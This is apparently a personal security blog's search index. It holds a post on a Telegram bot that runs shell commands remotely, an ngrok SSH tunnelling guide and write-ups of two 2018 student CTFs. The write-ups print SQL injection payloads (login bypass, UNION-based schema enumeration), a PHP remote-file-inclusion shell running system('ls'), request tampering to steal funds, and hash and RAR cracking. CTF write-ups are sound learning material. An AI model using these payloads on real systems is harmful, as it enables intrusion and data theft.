[{"categories":null,"contents":"This project is about a Telegram bot with the ability to execute terminal commands from your Telegram account and with the command response as messages.\nInitially, I started this project for personal needs, but I decided to release it because of the sure need of many with the same problem. I encountered and based in a project of Va5c0.\nIt often happens in a pentest or even more a bug bounty, that you need to enumerate targets or processes that take a lot of time as certain types of nmap scans, cracking some hash. And many times for that reason I leave that process working, checking if it is finished or not, leaving the computer on, sometimes with nothing else to do, sometimes I had to leave and turn off the computer leaving all the previous process without results. It is a high cost of time and money.\nSo now I share this little project of a bot (which I baptized as Bot Bounty) that can be used by a single person or several, as a company with this same need to improve productivity. Either on a computer, VPS, or a Raspberry. Keeping the degree of security that no one but the people who are authorized to use the bot will use it (in case someone external comes across the bot and try to use it).\nThe bot has predefined options for quick access to information that can be useful for bot usage. To mention a few: the available RAM space (info serv/RAM option), or the public IP of the device on which the bot is running.\nIn addition, with the command /exec you can execute any command that is available in our terminal of the device to use, for example:\nThus limiting itself to commands that require interaction, such as some unforced installation with the typical -y or logging in via SSH, to name a few examples.\nFor example, in amass, the command is /amassenum, which calls $ amass enum -d to perform an enumeration of subdomains:\nIn nmap we have a scan with the scripts, by default, pull out the port versions found, avoid performing host discovery (check if it is alive), and search all possible ports; i.e.: $ nmap -sC -sV -Pn -p-.\nOf course, to use these commands, the tools must be installed in the system you are using to run the bot (and you can call them directly in the console).\nAs a first release, we only have these commands; however, I am waiting for other shortcut commands to add to the bot that you suggest. Also, if you find bugs, you can write to me or issue an issue in the repository.\nThe repository is as follows: Bot Bounty\nPre-configurations To use it previously you must create a bot in Telegram and replace the API KEY that gives by the value specified in the script at line 12.\n1TOKEN = \u0026#39;XXXXXX:XXXXXXXXXXXXXXXXXXXXXXXX\u0026#39;. In addition to register the user ID(s) that will use the bot, in line 14:\n1authorizedUsers = [123456789, 987654321] And now just run the script.\n1$ python3 bot.py Tips **If the command's output is too big, you should save it in a file and without output **.\nfor example:\n nmapadv example.com \u0026gt; resultsExample.txt nmapadv example.com -oN resultsExample.txt exec echo 'awesome bot!' \u0026gt; yesItIs.txt  To check for possible unauthorized users trying to use the bot, a log of all executed commands with user details is kept in the file logFileBot.txt.\nAnd that would be it, for now; I hope this work is well received.\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/post/bot-bounty-telegram-bot/","tags":["bot","featured","bug bounty","pentest","tool"],"title":"Bot Bounty, a bot for Pentesting \u0026 Bug Bounty"},{"categories":null,"contents":"Seven years ago I begin on security information. I have more acknowledgment about web testing and pentesting with some awards on that and also in other areas. I am interested in being able to contribute to the improvement of computer security in the society of how important it is; It is not an expense, it is an investment.\n.bmc-button img{height: 34px !important;width: 35px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{padding: 7px 15px 7px 10px !important;line-height: 35px !important;height:51px !important;text-decoration: none !important;display:inline-flex !important;color:#FFFFFF !important;background-color:#FF813F !important;border-radius: 8px !important;border: 1px solid transparent !important;font-size: 24px !important;letter-spacing: 0.6px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Cookie', cursive !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#FFFFFF !important;}üç∫Buy me a Beer ","permalink":"https://drayko.github.io/about/","tags":null,"title":"About Drayko"},{"categories":null,"contents":"This post arose from a university job (for a Raspberry); however, it served me with other similar needs, to connect remotely without opening ports on the router.\nTo achieve an SSH connection (or another protocol) outside the local area, in a simple way, it seems this, for different reasons (it could be by enabling ports on the router, only that this according to the operator can become very difficult to achieve due to your policies among other things), then let's continue, you need to install Ngrok In the case of a Raspberry you need the version Linux(ARM) or in console:\n1wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip Then the unzip is done as explained in the ngrok console tutorial:\n1unzip ngrok-stable-linux-arm.zip The next thing is to register and/or enter ngrok, and once there, go to this link where it will show the token for your account\nOnce knowing your token you have to execute on your device:\n1./ngrok authtoken XXXXXHereYourTokenXXXXXXX With that it should be configured, all that remains is to listen to port 22, which is used by SSH, as follows:\n1./ngrok tcp 22 it is then when it shows them the Host and port it will point This shows at Forwarding the TCP address and port that enables us to work with our Raspberry.\nIn this case, it was 0.tcp.ngrok.io and port 17271, that is, instead of our local IP and default port (22), these must be specified to access our device outside the local area, that is:\n1ssh pi@0.tcp.ngrok.io -p17271 and that would be :D On the ngrok page you can review the variety and protocols available, with the same logic.\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/post/ssh-fuera-de-la-red-local/","tags":["Redes","SSH","Network","Ngrok"],"title":"SSH connection outside the local network"},{"categories":null,"contents":"Although this post is not something technical as usual, I find it quite interesting about the first computer in Bolivia.\nSomeone sent on the mailing list of the Free Software Community of Bolivia a link to a post in medium. Where some of the documented articles about the first computers in each country were listed, and discovering that Bolivia was on that list was interesting (the paper is among the ACM library).\nThe first computer, according to this article, is a IBM 1440 (as seen in the image), which the Bolivian Mining Corporation acquired (COMIBOL).\nThe article was published in 1969. It explains that the department created to use the machine had already been in operation for 3.5 years. So I deduce that the computer arrived in 1965 or 1966 (if anyone could confirm this, it would be incredible).\nHowever, the complicated thing at the beginning, as in almost any new equipment, was to find trained workers to use this machine. That was available for the accounting processes of the corporation, something that questioned the usefulness given the cost of the computer. So aptitude tests were made for its management, where 500 people applied, but only six passed. They sent these staff to be trained in COBOL and FORTRAN IV to do the data processing.\nAlthough it was a tremendous technological advance, there were still doubts about it and being criticized because the previous staff who carried out this accounting work by hand had to be practically fired.\nThe cost of technological advancement for specific jobs or careers continues to be devastating to this day due to the automation of processes and even more so when using \u0026quot;Artificial Intelligence\u0026quot; is already seen in so many areas that the human seems unnecessary.\nHowever, it is not the end of the road for everyone; it is the law of life and nature that the strongest or the one who adapts the fastest survives. In this case, being hand in hand with technology, you don't have to give up.\n-Hackers are People Too\n","permalink":"https://drayko.github.io/post/la-primera-computadora-en-bolivia/","tags":["curiosities","fun facts"],"title":"The first computer in Bolivia"},{"categories":null,"contents":"","permalink":"https://drayko.github.io/archives/","tags":null,"title":""},{"categories":null,"contents":"This CTF was composed of 74 teams from universities convened nationally for undergraduate and graduate level at the International Congress Of Computer Security (CIDSI in Spanish) which was organized by the Agency of Electronic Government and Information and Communication Technologies (AGETIC in Spanish). Thanks to the efforts of the Computer Incident Management Center(CGII) held from November 29 to December 1, 2018.\nFinishing this series, and as I mentioned in the previous post, in this one we participated in Team as Dark Army with Israel, Rafael and my person, accomplishing to solve all the challenges; However we could not recover all the statements or the specific flags(As they were written in literal form in the event), but they are explained as we solved it in the CTF, which lasted two half days.\nLevel 1 1.1. Traffic Analysis 1  Welcome. A company dedicated to banking has just hired you to perform traffic analysis. The problem is that there is an employee who is leaking email addresses, at the same time another employee started to pass passwords that have privileges to modify the salaries of employees. Your mission is to find that password.\n Well, to begin with, they give us a traffic capture, in which when we search with Wireshark we find a request with the username and password.\nthen the flag is:\n1007  1.2 Web crawlers  Unfortunately search engines are indexing many pages of this website that are confidential to us! Do you know which file prevents this from happening? Nobody wants fully indexed sites right?\n This is quite easy, the Flag is inside the robots.txt, which provides information to the search engine crawlers about the pages or files that they can request or not from your website.\n1http://url/robots.txt  1.3 Backups  Petr√≥leos del Caribe asked us to save a backup of its main jsp file. Unfortunately, the engineer in charge went to a plant in the middle of the sea and he can't tell us the extension with which he saved them. The supply manager requires the backup urgently, can you help me identify which file it is in? Do it soon my position is at stake. Remember that the most common backup extensions are:\n bak old bakup save   In this one we had to be somewhat observant, as much in the track as in what we have in front of us, it tells us the main jsp, which would come to mean the index.jsp in addition that the current page is http://url/index.jsp.\nSo trying with the extensions that they suggest us, it is possible to arrive to the answer\n1http://url/index.jsp.bakup Which contains\n1\u0026lt;%@ page contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34; language=\u0026#34;java\u0026#34; import=\u0026#34;java.sql.*,java.io.*,java.net.*,org.owasp.encoder.Encode, dbProcs.*, utils.*\u0026#34; errorPage=\u0026#34;\u0026#34; %\u0026gt; 2\u0026lt;%@ page import=\u0026#34;java.util.Locale\u0026#34;%\u0026gt; 3\u0026lt;%@ include file=\u0026#34;translation.jsp\u0026#34; %\u0026gt; 4\u0026lt;% 5\tShepherdLogManager.logEvent(request.getRemoteAddr(), request.getHeader(\u0026#34;X-Forwarded-For\u0026#34;), \u0026#34;DEBUG: index.jsp *************************\u0026#34;); 6\tLocale lang = new Locale(Validate.validateLanguage(request.getSession())); 7/** 8The flag/flag is: 402051f4be0cc3aad33bcf3ac3d6532b. 9 */ 10%\u0026gt; then that's where we get the flag\n1402051f4be0cc3aad33bcf3ac3d6532b  1.4 Programmer program  One of your friends left you a clue in java code development, but you must solve a mathematical puzzle before you can find the result. The flag is the key to enter his system (the smallest number you can find). But this is easy for you, they are not differential equations.\n give us a java file\n1package exploit; 2import java.util.Scanner; 3 4public class KeithLikesToTroll { 5 public static void main(String[] args){ 6 int clave; 7 8 Scanner scn = new Scanner(System.in); 9 System.out.print(\u0026#34;Introdusca la llave: \u0026#34;); 10 clave = scn.nextInt(); 11 scn.close(); 12 13 if(1338557220 / clave * clave != 1338557220 \u0026amp;\u0026amp; clave \u0026gt; 0){ 14 System.out.println(\u0026#34;Autenticacion correcta. La bandera es un n√∫mero peque√±o que te dejara entrar.\u0026#34;); 15 }else{ 16 System.out.println(\u0026#34;Autenticacion incorrecta.\u0026#34;); 17 } 18 } 19} Which should be compiled and executed in such a way that the lowest number of correct, with brute force can be reached quickly.\nThe Flag:\n18  1.5 Wifi admin panel  We are on vacation in the Caribbean, unfortunately, because of your friend the flight has just left us and we are waiting for 5 long hours at the airport. Another one of your friends found out that they can access free internet at the airport but to do so you must log in to the router. Do you dare to try how to log in?\n For this, we need to observe well, and the clue they give us is SMC Networks, which is a brand that produces Routers among other things, which with a little search we have some combinations of Users and Passwords by default which we try to find the correct and get the flag\n Level 2 2.1 Steganography  Did you know that the technique of hiding messages or objects inside images so that their existence is not perceived is steganography. We love this technique. So I will leave this image here and go very slowly.\nimage to download\n This at first puzzled us, however, the solution is to extract each printable string in the image, using strings from console(on Linux)\n1strings 8c373fd1a.jpeg And the Flag:\n11e5b77443345620c52d23c73dc87521c  2.2 Forensics  A dangerous criminal is passing hidden messages in pdfs sent by his accomplice abroad. You can do an analysis, you're almost a hacker. Did you find your flag? Download document\n In this case, parsing the metadata gives us the spoils; With the use of Exiftool:\n1exiftool CIDSI2018.pdf And the Flag:\n1c47d187067c6cf9  2.3 SQL Injection  We know that the coyote buys all his artifacts from ACME, can you help us display all the tuples in the table to find the trap with which he finally catches his nemesis?\n When I saw this one I thought it would take a while, however when I tried any injection a copy of the query I made appeared at the top, very Bricks style. So finding the solution was very quick with a typical bypass injection.\n1\u0026#39;)or(\u0026#39;1\u0026#39;)=(\u0026#39;1 Which gave us the Flag.\n 2.4 Reverse Engineering  One of the biggest dangers in mobile applications is reverse engineering. Because we can inspect the source code and find API keys, passwords, etc. We found an apk file while you were checking shared resources, luckily we saved it, now we want to know what it contains. There are several tools available to reverse engineer an APK file. Download APK\n As mentioned in the statement, there are several tools, I preferred to use Apktool\n1apktool d reversing.apk which gives us a folder with everything extracted, in which you can do a quick search with grep\n1user@pc:# grep \u0026#34;flag\u0026#34; . -R 2./reversing/smali/com/mobshep/reverseengineer/Reverse_Engineering.smali: const-string v0, \u0026#34;The flag/flag is 9yfdsj3md0lq75\u0026#34; and the Flag!\n19yfdsj3md0lq75  Level 3 3.1 Traffic analysis 2.  We are performing a traffic analysis because we detected that someone is leaking confidential information and the amount of information is so large that they compressed it with password protection, but finding the password is easy for you. Help us to find the password that will help us to access our flag. Download capture\n Finding the zip was not difficult, we only had to export it with Export Packet Bytes or exporting all the objects. Once arrived at this point the zip that we obtain is protected with a password as mentioned in the statement, for that, we had to observe the capture\nthe zip password\n1azulcrema and the flag!\n1IW{HTTP_BASIC_AUTH_IS_EASY}  3.2 User list  A group of users decided to complain because there is no coffee, can you believe it. And one of the users seems to be the one stealing the coffee, of course, he hid himself from the list. Help me find him and bring back the coffee to our lives.\n In this one it took me a while to realize, we were given a choice between consulting the information of 5 users, however, there was not something relevant among them, I tried to search by inspecting the elements, and the requests, however, the clue was in how the requests were made.\n1POST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 2Host: 192.168.3.100 3Accept: ** 4Accept-Language: en-US,en:q-0.5 5Accept-Encoding: gzip, deflate 6Referer: https://192.168.3.100/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646eOf313a4.jsp 7Content-Type: application/X-WWW-form-urlencoded 8X-Requested-With: XMLHttpRequest 9Content-Length: 45 10Connection: close 11 12userId%5B%5D=cfcd208495d565ef66e7dff9f98764da The request was identified this way: cfcd208495d565ef66e7dff9f98764da, which when verified was an MD5 and in plain text value 0:\n1cfcd208495d565ef66e7dff9f98764da = 0 When checking the others, they worked the same way, so I generated a list of MD5 hashed numbers to make requests until I found the hidden user, which was no more than the number 20.\n 3.3 HASHDUMP  Find the admin password\n1sistemas:500:9E689B23C4D33D88E4C560258374B547:7E058F739B8A1E67C00815FC1E5E0E25::: 2Guest:501:NO PASSWORD*********************:NO PASSWORD*********************::: 3nonadmin:1005:NO PASSWORD*********************:0CF3760C0B0EB9F570AACE7040DF6DB7::: 4contabilidad:1013:23AC1B85C36D31AAE45E0AE1804A24B0:DE6D8B1780A4F0714242AC53A6C2B2E8::: 5administrador:1014:CE9F401800DF01AFFF959C003A9671D0:A7B9ECDD64AA492E449E0A619FD16E4B::: 6gerencia:1015:4978646A5C99C2834D6A97A372D4BC83:C7994B298128024418AD0E9C5038570C:::  We can see that it is a dump of the Windows (NTLM) hashes.\nThis one took a while to figure out the trick, at first glance one would think that the admin account would be the one with such a name or similar, however, the trick was in the RID. The 500 belongs to the administrator account created during the OS installation, although in this case it is called sistemas.\nThen we have 2 ways to find it by brute force/dictionary or to look for it, to save time better to look for it and so we have, the flag!\n1coldplay  Level 4 4.1 Cracking rar  The users of the insurance company SEGURITAS are driving the systems staff crazy with their famous changes. As if they were going to change the world. If you are clever you will be able to access the flag that is compressed and password protected A systems employee has a clue for you. His id from a popular social network is 0x5afa18273c14.\n Download   First the id must be converted from Hexadecimal, then we get: 100030193548308.\nNow in facebook, we look for the profile: https://www.facebook.com/100030193548308 in which we find pictures of the employee spreading critical information about the company like that for rar files the password must have a number of length 5, then the only thing left is to crack the rar with a dictionary with all the possibilities of 5 digits numerals with John The Ripper.\n1john --wordlist=six --format=rar5 hashrar hashrar is the file where the hash of the RAR is located, then, we have the password.\n160372 With this we can extract the flag inside the archive:\n18743b52063cd84097a65d1633f5c74f5  4.2 Website bank  To complete this challenge you must create a bank account and transfer more than 10000 bs to it. When you have that amount in your bank account, simply log out and log in again to be rewarded with the flag.\n To start with you have to register, and the platform gives us the possibility to transfer money to other accounts\nHowever intercepting the requests was insecure, similar to this:\n1accountSource=4\u0026amp;accountDestination=2\u0026amp;amount=1200 so by modifying the request, we can reverse this\n1accountSource=2\u0026amp;accountTarget=4\u0026amp;amount=1200 this way we transfer money to ourselves, here is the result:\nVoila!\n10738FF78AE98A11F579A70F3F98468097426D4652B32A5F978818FC9CCB66CE74371A28833CC1A52854697C734D66249DB8E9AAB67F024262436EC8220C9OF11  Level 5 5.1 Exploiting  We are doing safe development, Your challenge is to change the flow of the program so that the hidden function executes. Once you succeed I will congratulate you on your success. The flag is the hexadecimal address of the function beat with the correct format (0x11223344) Download program\n For this one, we had to use IdaPro, and look for the address.\n10x080484BB And that would be it!\nHowever we could not take 1st place by six points, because those who solved a challenge first had extra points, but we were very happy with the great team we formed; being in 2nd place among so many teams.\nAny doubt, question, or complaint you can write me, I hope you liked the WriteUp.\n-Hackers are People Too üòú\nlinks of interest   Full undergraduate/postgraduate standings, click here the challenges were the same for both grades\n  To view event information here\n  series links  CTF UMSS WriteUp WirteUp Demo CTF CTF CIDSI 2018 ","permalink":"https://drayko.github.io/post/writeup-cidsi18/","tags":["CTF","WriteUp","featured"],"title":"WriteUp CTF CIDSI 2018"},{"categories":null,"contents":"This is the second part of the series of CTFs heading to CIDSI 2018. This time the CTF was held at the Universidad Mayor de San Sim√≥n (UMSS), a way of qualifying for those who would go to the event (CIDSI) representing our university.\nThis CTF was organized by the Scientific Society of Students of Systems and Informatics (SCESI -UMSS) with the support of the Headquarters of Careers of Informatics and Systems of the University Mayor of San Sim√≥n (UMSS). In addition to @crhystamil made the challenges, thank you very much for such good challenges!\nIt was hosted on the FBCTF platform, and we participated as a team as Dark Army with Israel, Rafael and my person, achieving 1st place, without further ado, let's get started!\n1.-  problema: ZmxhZ3tVTVNTX2VkdV9TY2VzaV9DdGZ9Cg==\n solution: Something simple to start with, as we can see, the solution is in Base64\nThe flag is:\n1flag{UMSS_edu_Scesi_Ctf}  2.-  Be very observant and find the flag for this challenge.\n solution: Well, in the problem it gives us a login: We could try more than one way to bypass the login, but first let's review the source code, it shows us that the login is being verified with Javascript:\n1var _0x9045=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x45\\x48\\x43\u0026#34;,\u0026#34;\\x4D\\x33\\x52\\x6F\\x61\\x57\\x4D\\x30\\x62\\x46\\x39\\x6F\\x4E\\x47\\x4E\\x72\\x4D\\x57\\x35\\x6E\u0026#34;,\u0026#34;\\x46\\x4C\\x41\\x47\\x20\\x65\\x6E\\x63\\x6F\\x6E\\x74\\x72\\x61\\x64\\x61\\x21\\x21\\x2C\\x20\\x69\\x6E\\x67\\x72\\x65\\x73\\x61\\x20\\x65\\x6C\\x20\\x66\\x6C\\x61\\x67\\x20\\x65\\x6E\\x20\\x65\\x6C\\x20\\x66\\x6F\\x72\\x6D\\x61\\x74\\x6F\\x20\\x66\\x6C\\x61\\x67\\x7B\\x2E\\x2E\\x2E\\x2E\\x7D\u0026#34;,\u0026#34;\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\u0026#34;,\u0026#34;\\x69\\x6E\\x64\\x65\\x78\\x2E\\x68\\x74\\x6D\\x6C\u0026#34;,\u0026#34;\\x59\\x6F\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x6C\\x65\\x66\\x74\\x20\u0026#34;,\u0026#34;\\x20\\x61\\x74\\x74\\x65\\x6D\\x70\\x74\\x3B\u0026#34;,\u0026#34;\\x64\\x69\\x73\\x61\\x62\\x6C\\x65\\x64\u0026#34;,\u0026#34;\\x73\\x75\\x62\\x6D\\x69\\x74\u0026#34;];var attempt=3;function validate(){var _0xd22bx3=document[_0x9045[2]](_0x9045[1])[_0x9045[0]];var _0xd22bx4=document[_0x9045[2]](_0x9045[3])[_0x9045[0]];if(_0xd22bx3== _0x9045[4]\u0026amp;\u0026amp; _0xd22bx4== atob(_0x9045[5])){alert(_0x9045[6]);window[_0x9045[7]]= _0x9045[8];return false}else {attempt--;alert(_0x9045[9]+ attempt+ _0x9045[10]);if(attempt== 0){document[_0x9045[2]](_0x9045[1])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[3])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[12])[_0x9045[11]]= true;return false}}} However it is obfuscated, we can search many sites online to plain it and have it more understandable:\n1var attempt = 3; 2 3function validate() { 4 var _0xd22bx3 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;value\u0026#39;]; 5 var _0xd22bx4 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;value\u0026#39;]; 6 if (_0xd22bx3 == \u0026#39;EHC\u0026#39; \u0026amp;\u0026amp; _0xd22bx4 == atob(\u0026#39;M3RoaWM0bF9oNGNrMW5n\u0026#39;)) { 7 alert(\u0026#39;FLAG encontrada!!, ingresa el flag en el formato flag{....}\u0026#39;); 8 window[\u0026#39;location\u0026#39;] = \u0026#39;index.html\u0026#39;; 9 return false 10 } else { 11 attempt--; 12 alert(\u0026#39;You have left \u0026#39; + attempt + \u0026#39; attempt;\u0026#39;); 13 if (attempt == 0) { 14 document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; 15 document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; 16 document[\u0026#39;getElementById\u0026#39;](\u0026#39;submit\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; 17 return false 18 } 19 } 20} We can analyze that the username is: EHC, and the password is hidden in Base64(atob): 3thic4l_h4ck1ng. Then the login tells us that the flag is the password with the format flag {...} :\n1flag{3thic4l_h4ck1ng}  3.-  file_5e9666c7a0773f3785123f19986b4c5f\n they give us a text file, which contains the following\nAs we can see, it is a hexdump, we can reverse it with xxd:\n1xxd -r file_5e9666c7a0773f3785123f19986b4c5f \u0026gt; myfile which gives us an image:\nand directly gives us the flag\n1flag{FL4g_Facil_o_Difici1}  4.-  SQLi\n well... he gave us a login with google captcha. I really hated this challenge and also my team, thanks @crhystamil :) hehehe, but let's continue. Clearly it was about doing a SQL injection, however we tried with the typical admin:admin which gave us an answer of Buen_Intento_Pero_EsteNo_esEl_Flag, with this we could deduce that it was a valid user but not the one we want.\nAfter several attempts with MySql statements ... I tried Postgres with admin as password, to fulfill a valid query of course.\n1-\u0026#39; UNION ALL SELECT NULL,NULL,current_database(),NULL-- It responds with ctf :D\nNow we continue trying to call the existing tables.\n1-\u0026#39; UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables LIMIT 1 OFFSET 0-- response: users\nLuckily, the table we want skips on the first try, however, it does not allow us to make requests directly, but rather by encoding it.\n1users =\u0026gt; CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) Which would be based on ASCII.\nIt would look something like this:\n1-\u0026#39; UNION ALL SELECT NULL,NULL,column_name,NULL FROM information_schema.columns where table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) LIMIT 1 OFFSET 0-- In the response we are enumerating increasing the OFFSET. Columns that can be useful to us:id, users,pass, flag. Now, we are only one step away from achieving it,however...\n1-\u0026#39; UNION ALL SELECT NULL,NULL,flag,NULL FROM ctf.public.users LIMIT 1 OFFSET 29-- The answer was until the 29th attempt, again, thanks @crhystamil.\nThe flag:\n1DJC{Buen_Intento_esEl_Flag}  5.-  Beware of running everything\n in this case it gives us a host in which it is executing even the images it has, which is obviously a bad practice, it gives us an open door to a RFI. From a remote server we try to locate the flag with a quick shell.\n1\u0026lt;?php 2 system(‚Äòls‚Äô); 3?\u0026gt;This shows us the files in the current directory, in which there was a file that when read it gave us the flag just changing the URL for the file that contains it.\n-2s3d5f6g7g549fy4nfp734lk37-\nThe flag:\n1flag{3hc_gr0up_h4ck1ng_Dragonjar}  6.-  firmware analysis\n He give us an image to analyze:open-hacking_151b4da179e4163e7e879da22e0c76e2.bin\nWhich we can use to extract the files they contain with Binwalk\n1binwalk -Me open-hacking_151b4da179e4163e7e879da22e0c76e2.bin So we can parse it and we get the flag:\n1bandera{43320192606d672bf0db1280026c799902f03bdd} I think that would be :D However this are not all the problems, we could not complete them :( But and thanks to @crhystamil! for build this fun CTF :D\nthe next write up is from CIDSI!\n-Hackers are People Too üòú\nSeries links  The previous WriteUp(CIDSI Demo WriteUp) WriteUp CTF CIDSI18 ","permalink":"https://drayko.github.io/post/writeup-ctfumss18/","tags":["CTF","WriteUp"],"title":"Write Up CTF UMSS 2018"},{"categories":null,"contents":"Search content in the blog!\n","permalink":"https://drayko.github.io/search/","tags":null,"title":"Search Results"}]